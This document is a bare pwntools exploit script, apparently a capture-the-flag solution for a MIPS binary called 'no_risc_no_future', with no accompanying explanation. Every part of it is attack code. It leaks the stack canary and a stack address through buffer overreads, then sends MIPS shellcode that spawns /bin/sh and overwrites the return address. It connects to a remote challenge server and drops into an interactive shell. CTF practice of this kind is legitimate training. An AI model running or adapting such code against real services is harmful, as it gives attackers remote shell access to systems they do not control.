#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./no_risc_no_future"

rhp1 = {"host":"noriscnofuture.forfuture.fluxfingers.net","port":1338}
rhp2 = {'host':"localhost",'port':1234}
context(os='linux',arch='mips')
binf = ELF(FILENAME)

shellcode = "\x50\x73\x06\x24\xff\xff\xd0\x04\x50\x73\x0f\x24\xff\xff\x06\x28\xe0\xff\xbd\x27\xd7\xff\x0f\x24\x27\x78\xe0\x01\x21\x20\xef\x03\xe8\xff\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x23\xab\x0f\x02\x24\x0c\x01\x01\x01/bin/sh"

def exploit(conn):
  print("connected")

  conn.send("A"*(16*4+1)) #last byte of canary is always 0x00??
  conn.recvuntil("A"*(16*4+1))
  canary = unpack(conn.recvline()[:-1].ljust(4,'\x00'))
  canary = canary << 8
  print("[+]canary: "+hex(canary))

  sleep(1)
  conn.send("A"*(4*26))
  conn.recvuntil("A"*(4*26))
  stack = unpack(conn.recv(4).ljust(4,"\x00"))
  print("[+]stack: "+hex(stack))
  stack_shellcode = stack-0x50+0x4
  print("[+]stack shellcode: "+hex(stack_shellcode))

  sleep(1)
  for i in range(0xa-(1+2)):
    print("sent")
    conn.sendline("A")
    sleep(0.5)
    conn.recvline()

  sleep(1)
  payload = shellcode
  payload += "\x00" * (4*16 - len(payload))
  payload += p32(canary)
  payload += "\x00" * (4*18 - len(payload))
  payload += p32(stack_shellcode)
  conn.send(payload)

if len(sys.argv)>1:
  conn = remote(rhp1["host"],rhp1["port"])
else:
  conn = gdb.debug("./no_risc_no_future")

exploit(conn)
conn.interactive()

